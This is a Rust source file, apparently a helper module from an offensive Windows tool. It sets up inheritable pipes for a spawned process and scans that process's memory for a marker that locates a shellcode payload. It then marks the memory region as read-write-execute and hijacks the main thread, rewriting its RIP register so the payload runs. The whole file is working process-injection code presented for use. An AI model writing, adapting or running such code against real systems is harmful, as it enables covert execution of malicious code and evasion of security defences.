use std::{env,ptr};
use std::ffi::{CString, NulError, c_void};

use windows::Win32::System::Pipes::{CreatePipe};
use windows::Win32::Security::{SECURITY_ATTRIBUTES};
use windows::Win32::System::Threading::{ResumeThread, SuspendThread};
use windows::Win32::System::SystemInformation::{SYSTEM_INFO,GetSystemInfo};
use windows::Win32::Foundation::{HANDLE_FLAG_INHERIT, HANDLE, SetHandleInformation};
use windows::Win32::System::Diagnostics::Debug::{CONTEXT_FULL_AMD64, CONTEXT,GetThreadContext, ReadProcessMemory, SetThreadContext};
use windows::Win32::System::Memory::{MEM_COMMIT, MEM_PRIVATE, PAGE_EXECUTE_READWRITE, PAGE_GUARD, PAGE_NOACCESS, MEMORY_BASIC_INFORMATION, PAGE_PROTECTION_FLAGS, VirtualProtectEx, VirtualQueryEx};

/// A struct for store the different hStd
/// 
/// Keep a trace of four Handle created by CreatePipe 
/// and SECURITY_ATTRIBUTES.
pub struct Handle {
    pub h_std_in_read: HANDLE,
    pub h_std_in_write: HANDLE,
    pub h_std_out_read: HANDLE,
    pub h_std_out_write: HANDLE,
    pub security_attr: SECURITY_ATTRIBUTES,
}


/// MemoryInfo store information about the process created
/// 
/// Keep trace of region base address where the pattern was found
/// Keep trace of region size
/// Keep trace at which offset the pattern was found
/// Keep trace of oldflags of memory region
#[derive(Default)]
pub struct MemoryInfo {
    pub r_base_addr: usize,
    pub r_size: usize,
    pub offset: usize,
    pub oldflag: PAGE_PROTECTION_FLAGS,
}


/// Get the args passing by the user
/// 
/// # Returns
/// 
/// On success, returns a CString
/// On failure, returns NulError
pub fn get_args() -> Result<CString,NulError> {

    let args: Vec<String> = env::args().collect();

    if args.len() != 2 {
        eprintln!("[-] Programme path is required");
    }

    let result = CString::new(args[1].clone());
    match result {
        Ok(path) => Ok(path),
        Err(e) => Err(e),
    }

}

/// Create the four pipes that are used for communication with remote process
/// 
/// # Returns
/// 
/// On success, returns struct Handle
pub fn create_pipe() -> Handle {

    let mut h_std_in_r: HANDLE = HANDLE(ptr::null_mut());
    let mut h_std_in_w: HANDLE = HANDLE(ptr::null_mut());
    let mut h_std_out_r: HANDLE = HANDLE(ptr::null_mut());
    let mut h_std_out_w: HANDLE = HANDLE(ptr::null_mut());


    let security_attr: SECURITY_ATTRIBUTES = SECURITY_ATTRIBUTES {
        nLength: std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32,
        lpSecurityDescriptor: std::ptr::null_mut(),
        bInheritHandle: true.into(),
    };

    let sa = Some(&security_attr as *const SECURITY_ATTRIBUTES);

    let result = unsafe {CreatePipe(&mut h_std_in_r, &mut h_std_in_w, sa, 0) };
    match result {
        Ok(()) => {
            println!("[+] Successfully creating STDIN pipe");
        },
        Err(e) => println!("[-] Error while creating pipe: {e}") ,
    }

    let result = unsafe {
        SetHandleInformation(h_std_in_w, 0,HANDLE_FLAG_INHERIT)
    };
    match result {
        Ok(()) => println!("[+] Change HANDLE FLAGS"),
        Err(e) => println!("[-] Failed to change HANDLE FLAGS {e}"),
    }

    let result = unsafe {CreatePipe(&mut h_std_out_r, &mut h_std_out_w, sa, 0) };
    match result {
        Ok(()) => {
            println!("[+] Successfully creating STDOUT pipe");
        },
        Err(e) => println!("[-] Error while creating pipe: {e}") ,
    }

    let result = unsafe {
        SetHandleInformation(h_std_out_r, 0,HANDLE_FLAG_INHERIT)
    };
    match result {
        Ok(()) => println!("[+] Change HANDLE FLAGS"),
        Err(e) => println!("[-] Failed to change HANDLE FLAGS {e}"),
    }


    let my_handle = Handle {
        h_std_in_read: h_std_in_r,
        h_std_in_write: h_std_in_w,
        h_std_out_read: h_std_out_r,
        h_std_out_write: h_std_out_w,
        security_attr: security_attr,
    };

    my_handle

}


/// Usefull for finding where the payload is on remote memory process
/// 
/// # Arguments
/// 
/// * `ns_handl` - Handle on the remote process created
/// * `pattern` - The pattern to found
/// 
/// # Returns
/// 
/// On succes, returns Option<MemoryInfo>
/// On failure, returns None
pub fn find_offset(ns_handle: HANDLE, pattern: &[u8]) -> Option<MemoryInfo> {
    
    let mut system_info: SYSTEM_INFO = SYSTEM_INFO {..Default::default()};
    unsafe { GetSystemInfo(&mut system_info);}

    let mut memory_info: MEMORY_BASIC_INFORMATION = MEMORY_BASIC_INFORMATION {..Default::default()};
    let start_address = system_info.lpMinimumApplicationAddress as *const c_void;
    let memory_info_size: usize = size_of::<MEMORY_BASIC_INFORMATION>();
    let mut addr: usize = start_address as usize;
    let mut read_memory_buffer = vec![0u8;4096];
    let mut bytes_read :usize = 0;
    let mut current_addr: usize;

    loop {

        let result  = unsafe {
            VirtualQueryEx(ns_handle, Some(addr as *const c_void), &mut memory_info, memory_info_size)
        };

        // verify VirtualQueryEx not failed
        if result == 0 {
            println!("[-] Failed to get VirtualMemory Region size equal: {result}");
            break None;
        }

        // save current addr for read memory
        current_addr = addr;
        // prepare addr for next iteration
        addr += memory_info.RegionSize;
        // println!("[*] Next region base address: {:#x}", addr);
        if addr >= system_info.lpMaximumApplicationAddress as usize {
            break None;
        }

        // search for correct memory region
        // Verify is memory is commited
        if memory_info.State != MEM_COMMIT {
            continue;
        }
        // Verify if memory region is no_acces or is a page guard
        if memory_info.Protect.contains(PAGE_GUARD) || memory_info.Protect.contains(PAGE_NOACCESS) {
            continue;
        }
        // Verify if region MEM_PRIVATE
        if memory_info.Type != MEM_PRIVATE {
            continue;
        }


        let region_start: usize = current_addr;
        // loop for full reading memory region
        loop {
            
            if (current_addr - region_start) == memory_info.RegionSize {
                break;
            } else {
                let result = unsafe {
                    ReadProcessMemory(ns_handle,
                        current_addr as *const c_void,
                        read_memory_buffer.as_mut_ptr() as *mut c_void,
                        read_memory_buffer.len(), 
                        Some(&mut bytes_read))
                };

                match result {
                    Ok(_) => {
                        let index = read_memory_buffer.windows(pattern.len()).position(|window| window == pattern);
                        match index {
                            Some(idx) => {
                                let offset = current_addr + idx;
                                println!("[+] Find pattern in memory at {:#x}",offset);
                                
                                let mem_info: MemoryInfo = MemoryInfo {
                                    r_base_addr: region_start,
                                    r_size: memory_info.RegionSize,
                                    offset: offset,
                                    oldflag: memory_info.Protect
                                };
                                return Some(mem_info);
                            },
                            None => {}
                        }
                        
                    },
                    Err(e) => println!("[-] Failed to read process memory: {e}, @ {:#x}", current_addr ),
                }
                    current_addr += read_memory_buffer.len();
            }   
        }

    }

}


/// Change the region protection where the payload is stored to RWX.
/// 
/// # Arguments
/// 
/// * `ns_handle` - Handle on the remote process
/// * `mem_info` - A reference to the structure MemoryInfo
pub fn change_protect(ns_handle: HANDLE, mem_info: &MemoryInfo){

    let new_page_protect: PAGE_PROTECTION_FLAGS = PAGE_EXECUTE_READWRITE;
    let mut old_page_protect: PAGE_PROTECTION_FLAGS = mem_info.oldflag;
    unsafe {
        let result = VirtualProtectEx(
            ns_handle, 
            mem_info.r_base_addr as *const c_void,
            mem_info.r_size, 
            new_page_protect, 
            &mut old_page_protect);

        match result {
            Ok(_) => println!("[+] Successfully change permission at @ {:#x}",mem_info.r_base_addr),
            Err(e) => println!("[-] Can't change permission: {e}"),
        }
    };

}


/// Hijack the main thread of remote process
/// 
/// This function use the wellknown method,
/// SuspendThread -> GetThread -> SetThread -> ResumeThread
/// to change the RIP pointer and send where the shellcode is stored
/// 
/// # Arguments
/// 
/// * `ns_thread` - The handle of the remote process main thread
/// * `offset` - The address where the payload is stored
pub fn hijack_main_thread(ns_thread: HANDLE, offset: u64){

    println!("[*] Hijacking main thread...");
    let _ = unsafe { SuspendThread(ns_thread)};

    let mut context: CONTEXT = CONTEXT::default();
    
    // init the context for retrieve all the register
    context.ContextFlags = CONTEXT_FULL_AMD64;
    let result = unsafe { GetThreadContext(ns_thread,&mut context)};
    match result {
        Ok(_) => println!("[+] Successfully get thread context"),
        Err(e ) => println!("[-] Failed to get thread context: {e}"),
    }

    println!("[*] The RIP point at @ {:#x} and RSP @ {:#x}",context.Rip,context.Rsp);

    // change rip pointer
    let addr_payload: u64 = offset + 15 as u64;
    context.Rip = addr_payload;

    // set the context
    let result = unsafe { SetThreadContext(ns_thread, &context as *const CONTEXT)};
    match result {
        Ok(_) => println!("[+] Successfully set thread context"),
        Err(e) => println!("[-] Failed to set thread context: {e}")
    }

    println!("[*] The RIP point now at @ {:#x} and RSP @ {:#x}",context.Rip,context.Rsp);

    // resume the thread
    let result = unsafe { ResumeThread(ns_thread)};
    
    println!("[+] Successfully resuming main thread: {:?}",result);


}